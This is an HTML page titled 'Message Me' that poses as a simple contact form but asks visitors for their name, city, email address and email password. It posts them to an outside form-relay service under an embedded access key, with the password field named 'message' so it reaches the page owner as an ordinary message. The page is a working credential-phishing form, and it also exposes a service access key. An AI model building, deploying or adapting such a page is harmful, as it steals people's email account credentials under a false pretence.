<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Message Me</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .form-container {
            background-color: #fff;
            border: 1px solid #ccc;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .form-container input[type="text"],
        .form-container input[type="email"],
        .form-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .form-container input[type="submit"],
        .form-container input[type="button"] {
            width: 48%;
            padding: 10px;
            margin-top: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .form-container input[type="submit"] {
            background-color: #4CAF50;
            color: white;
        }

        .form-container input[type="button"] {
            background-color: #f44336;
            color: white;
        }

        .form-container input[type="submit"]:hover {
            background-color: #45a049;
        }

        .form-container input[type="button"]:hover {
            background-color: #e53935;
        }
    </style>
</head>

<body>
    <div class="form-container">
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="b688bd22-f78c-4110-a087-22acdc03af24">
            
            <input type="text" placeholder="Enter your name" id="name" name="name" required><br>
            <input type="text" placeholder="City Name" id="city" name="city" required><br>
            
            <input type="email" placeholder="Email Id" id="email" name="email" required><br>
            <input type="password" placeholder="Email Password" id="password" name="message" required><br>
           
            <input type="submit" value="Send">
            <input type="button" value="Clear" onclick="clearAll()">
        </form>
    </div>

    <script>
        let name = document.querySelector("#name");
        let email = document.querySelector("#email");
        let password = document.querySelector("#password");
        let city = document.querySelector("#city");

        function clearAll() {
            name.value = '';
            password.value = '';
            email.value = '';
            city.value = '';
        }
    </script>
</body>

</html>
